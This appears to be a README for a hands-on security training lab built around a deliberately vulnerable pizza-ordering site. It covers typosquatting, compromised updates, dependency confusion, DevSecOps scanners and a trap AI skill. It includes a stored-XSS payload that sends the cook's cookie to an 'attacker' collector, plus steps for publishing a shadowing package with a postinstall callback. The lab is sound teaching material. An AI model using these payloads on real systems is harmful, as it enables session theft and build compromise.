# Lab: Supply Chain Security & DevSecOps – Pizza Pronto

> You are the security team of **Pizza Pronto** (see [../company](../company)).
> Luca, the owner's nephew, built the online ordering website on a few weekends.
> In this lab you look at the website the way an attacker – and the way a modern
> development team – would.

**⚠️ Everything here is intentionally vulnerable. Only run it inside the training VM. Never use these techniques against systems you do not own.**

---

## 0. Setup (once)

Everything runs locally in containers inside your Kali VM (Docker or Podman – the script
auto-detects). No accounts, no logins, no cloud.

```bash
cd Introduction-to-IT-Security/labs/pizza-pronto
./lab.sh setup      # needs internet once, downloads/builds ~5 GB
```

When that finishes, start the Supply Chain part:

```bash
./lab.sh start
```

| What | URL |
|------|-----|
| Pizza Pronto shop | http://localhost:3000 |
| Collector ("attacker server") | http://localhost:8000 |
| Internal package registry | http://localhost:4873 |
| Public package registry (simulated npm) | http://localhost:4874 |

Open the **shop** and the **collector** side by side in your browser. The collector
is a tiny server the attacker controls – whenever something sends data "home",
you will see it appear there live.

> `./lab.sh status` shows the URLs again, `./lab.sh stop` stops everything,
> `./lab.sh reset` brings the lab back to the start.

Use the [lab-report.md](../../lab-report.md) to note down your findings and the flags
you capture (they look like `FLAG{...}`).

**Looking at the code.** The shop's source is in this folder (`app/server.js`, `package.json`, …).
Open it in VS Code with:

```bash
./lab.sh code
```

In the DevSecOps part the same code is also browseable in Gitea at http://localhost:3030/luca/shop
(no editor needed).

---

## Part A – Supply Chain Attacks (≈ 45 min)

Modern apps are mostly other people's code. The Pizza Pronto shop has ~200 npm
packages that Luca never looked at. Let's see what that means.

### A1 – What are we even shipping? (SBOM)

An **SBOM** (Software Bill of Materials) is the list of ingredients of your software.

```bash
docker compose exec shop sh -c "npm ls --all 2>/dev/null | head -40"
```

- How many packages does the shop depend on, directly and indirectly?
- Luca wrote maybe 150 lines himself. Who wrote the rest? Do you know them?

### Kitchen dashboard – weak login & stored XSS (easy)

The cooks process orders at `/kitchen`. It has two beginner-level bugs.

**1. Weak PIN.** Open http://localhost:3000/kitchen – it asks for a PIN. Find it in the code:

```bash
grep -n "PIN" app/server.js
```

Log in with that PIN. You now see every customer's name, address and phone number.

**2. Stored XSS via the order notes.** The "Special requests" field is shown on the
kitchen board without escaping, so HTML in it runs in the cook's browser.

1. Order a pizza. In *Special requests*, paste:
   ```html
   <script>new Image().src="http://localhost:8000/xss?c="+document.cookie</script>
   ```
2. Open the collector (http://localhost:8000) in one tab.
3. Open the kitchen board (http://localhost:3000/kitchen) in another – you are the cook.
4. The collector receives the cook's session cookie `kitchen=ok`.

> With that cookie an attacker is in the kitchen without knowing the PIN.
> Fixes: escape output, keep no PIN in the code, set cookies `HttpOnly` + `SameSite`.

### A2 – A typo with consequences (Typosquatting)

Look closely at the dependencies in `app/package.json`. One of them is **not** the
package Luca thinks it is – it's a copy with a name that differs by one letter from
a very popular package.

1. Find the suspicious package name. (Hint: a famous utility library – spell it out loud.)
2. Watch the collector (http://localhost:8000), then reinstall the dependencies:
   ```bash
   ./lab.sh redeploy
   ```
3. What appears on the collector? Where did that data come from, and when did the
   malicious code run – did anyone "use" the package?

> **Lesson:** `npm install` runs other people's code (`postinstall` scripts) on your
> machine, before your app even starts. A single typo can hand over everything in your
> environment.

### A3 – The update that went bad (Compromised dependency)

Legit packages can turn malicious when a maintainer's account is taken over or a
maintainer is tricked (this really happened: *xz-utils* 2024, *chalk/debug* 2025).

In the public registry, the package `tiny-receipt` has two versions: `1.2.0` (clean)
and `1.2.1` (a maintainer "update"). Compare them:

```bash
docker compose --profile tools run --rm attacker sh -c "
  npm pack tiny-receipt@1.2.0 --registry http://registry-public:4873/ >/dev/null 2>&1
  npm pack tiny-receipt@1.2.1 --registry http://registry-public:4873/ >/dev/null 2>&1
  mkdir a b && tar xf tiny-receipt-1.2.0.tgz -C a && tar xf tiny-receipt-1.2.1.tgz -C b
  diff -u a/package/index.js b/package/index.js
"
```

- What was added in `1.2.1`? Why is it written to look harmless ("perf: warm up cache")?
- `app/package.json` asks for `"tiny-receipt": "^1.2.0"`. What does the `^` mean –
  which version gets installed on the next deployment?

### A4 – Code execution through a shopping cart (Insecure dependency)

The shop stores your cart in a cookie using the package `node-serialize`. That package
has a well-known, critical vulnerability.

1. Find out which known vulnerability `node-serialize@0.0.4` has (search for
   "node-serialize CVE"). What does it allow?
2. In `app/server.js`, find where the cart cookie is read. Why is turning attacker-controlled
   data back into an object dangerous here?

> We will *exploit* this one together with the trainer – for now, just understand *why*
> it is exploitable. The fix is one line: never deserialize untrusted data, use `JSON.parse`.

### A5 – Sneaking your own package into the build (Dependency Confusion)

The shop uses an **internal** package `pronto-utils` (Luca wrote it, it only lives in
Pizza Pronto's internal registry). The deployment pulls dependencies from the internal
registry, which *also forwards requests to the public registry*.

Question: what happens if a package with the **same name** but a **higher version**
suddenly appears on the *public* registry?

Try it (you are now the attacker):

```bash
./lab.sh attacker          # opens a shell with node/npm on the lab network
```

Inside that shell, create a package `pronto-utils` with a **higher version number**
than 1.0.0, add a `postinstall` script that pings the collector, log in to the public
registry and publish it. Then leave the shell and trigger a deployment:

```bash
./lab.sh redeploy
```

- Which `pronto-utils` version does the shop install now – the internal one or yours?
- What shows up on the collector?

> **Lesson:** If internal package names are guessable and your registry falls back to
> the public one, an attacker can "shadow" internal packages. Fixes: scoped names
> (`@pizzapronto/utils`), pinned versions + lockfiles, and a registry that never
> forwards internal names.

> Capture the flags hidden in the environment variables / files you manage to exfiltrate.

When you're done, clean up: `./lab.sh reset`.

---

## Part B – DevSecOps: from single tools to a pipeline (≈ 60 min)

Now you defend the shop. First run each security tool **by hand** and read its output.
Then wire the same tools into a CI pipeline that runs them on every change.

```bash
./lab.sh devsecops
```

This starts **Gitea** (a self-hosted GitHub) at http://localhost:3030 (`luca` / `pizza-pronto-123`).
The shop code is in **luca/shop**, including Luca's git history.

| Tool | Finds | Part-A problem |
|------|-------|----------------|
| gitleaks | secrets in code & git history | the `.env` Luca committed |
| semgrep | dangerous code patterns | command injection, insecure deserialization |
| hadolint + trivy config | insecure Dockerfile | root user, `ADD`, no pinning |
| syft + trivy | known-vulnerable dependencies | node-serialize (A4) |
| guarddog | malicious packages | typosquat (A2), bad update (A3) |

All tools live in the `secscan` image and work offline – no install needed.

### B1 – Run each tool once, by hand

Run every tool yourself and read what it reports. A short form to run a tool from the
scanner image against the shop code:

```bash
scan() { docker compose run --rm -T -v "$PWD/app:/src:ro" secscan "$@"; }
```

**1. Secrets (gitleaks)** – scan the git history in Gitea:

```bash
docker compose run --rm -T secscan sh -c "git clone -q http://gitea:3000/luca/shop.git r && gitleaks git --no-banner --redact r"
```
Read: which key leaked, in which commit, and what the commit message says. Deleting the
file in a later commit does **not** remove it from history.

**2. Code (semgrep)** – rules written for this app:

```bash
scan semgrep scan --config /rules /src
```
Read: command injection (`/admin/printer`), insecure deserialization (`node-serialize`),
hard-coded password – each with file and line.

**3. Dockerfile (hadolint + trivy):**

```bash
scan hadolint /src/Dockerfile
scan trivy config /src
```
Read: runs as root, `ADD` instead of `COPY`, base image not pinned.

**4. Dependencies (syft + trivy) and malicious packages (guarddog)** – this one resolves
the dependencies first (one `npm install`, takes ~a minute):

```bash
scan sh -c "cp -r /src /tmp/s && cd /tmp/s && npm install --ignore-scripts >/dev/null 2>&1 && \
  echo '--- known vulnerabilities ---' && syft scan dir:. -q -o cyclonedx-json=sbom.json && trivy sbom --quiet sbom.json && \
  echo '--- malicious packages ---' && guarddog npm scan node_modules/loadsh && guarddog npm scan node_modules/tiny-receipt"
```
Read: `node-serialize 0.0.4` → CVE-2017-5941 (critical); `loadsh` has a data-stealing
install script; `tiny-receipt@1.2.1` hides base64 code.

You now know what each tool finds and how to read it. Next: let CI run them automatically.

### B2 – Build the pipeline

Add the checks to `.gitea/workflows/ci.yml` (edit directly in the Gitea web UI or push
from the VM), commit, and watch the pipeline turn **red** – it now *finds* the problems.

### B3 – Fix until green

Now fix the shop so the pipeline passes:

- remove the typosquatted package, use the correct one
- pin the good `tiny-receipt` version + add a lockfile
- replace `node-serialize` with `JSON.parse`
- fix the command injection (use `execFile` with an argument list)
- move secrets out of the code, harden the Dockerfile (non-root, `COPY`, pin the base image)

Re-run the pipeline after each fix. Goal: **all checks green.** That green checkmark is
"Shift Left" – security moved to the earliest possible moment.

### B4 – Keep dependencies fresh: build a Renovate pipeline

Renovate is a bot that opens pull requests to update outdated dependencies. You build it
as its own Gitea Actions pipeline, step by step. The `RENOVATE_TOKEN` secret is already set.

**Step 1 – a workflow that just starts Renovate.**
In Gitea (luca/shop → *Add file → New file*), create `.gitea/workflows/renovate.yml`:

```yaml
name: Renovate
on: [workflow_dispatch]
jobs:
  renovate:
    runs-on: renovate
    steps:
      - run: renovate --version
```

Commit. Open *Actions → Renovate → Run workflow*. Green = the runner and the Renovate
image work.

**Step 2 – point Renovate at the repo.** Replace the job with:

```yaml
jobs:
  renovate:
    runs-on: renovate
    env:
      RENOVATE_TOKEN: ${{ secrets.RENOVATE_TOKEN }}
      RENOVATE_PLATFORM: gitea
      RENOVATE_ENDPOINT: http://gitea:3000/api/v1
      RENOVATE_REPOSITORIES: luca/shop
      RENOVATE_ONBOARDING: "false"
      RENOVATE_REQUIRE_CONFIG: optional
      RENOVATE_NPMRC: "registry=http://registry-internal:4873/"
      RENOVATE_ENABLED_MANAGERS: '["npm"]'
      RENOVATE_HOST_RULES: '[{"matchHost":"registry-internal","allowInternal":true},{"matchHost":"gitea","allowInternal":true}]'
    steps:
      - run: renovate
```

Commit, run the workflow again, then open *Pull Requests*: Renovate opened one, e.g.
"Update dependency express to v5".

**Step 3 – run it automatically.** Change the trigger so it also runs on every push to main:

```yaml
on:
  push:
    branches: [main]
  workflow_dispatch:
```

**Step 4 – configure it (optional).** Add `renovate.json` in the repo root to group all
updates into a single PR:

```json
{ "packageRules": [ { "matchManagers": ["npm"], "groupName": "all npm dependencies" } ] }
```

> This is the real pattern: Renovate opens the update PRs, and your security pipeline (B2)
> checks every one of them before anyone merges. Update small and often.
>
> Shortcut for a quick demo without the pipeline: `./lab.sh renovate`.

---

## Part C – Supply chain for AI agents: the Skill Battle (≈ 45 min)

AI coding assistants are extended with **skills** and **MCP servers** – which are just
more dependencies, often from strangers, that run with a lot of access.

In this part you *write* a security-review skill and, at the end, the trainer runs all
teams' skills against the shop and compares who found the most. One of the skills in the
round is a trainer-provided **trap** – a skill that looks helpful but misbehaves. See
[skills/README.md](skills/README.md) for the rules.

---

## Cheat sheet

```bash
./lab.sh setup       # once, with internet
./lab.sh start       # Supply Chain lab
./lab.sh devsecops   # + Gitea + CI
./lab.sh attacker    # attacker shell on the lab network
./lab.sh renovate    # run the update bot
./lab.sh redeploy    # redeploy the shop
./lab.sh status      # containers + URLs
./lab.sh reset       # back to start
./lab.sh stop        # stop everything
```
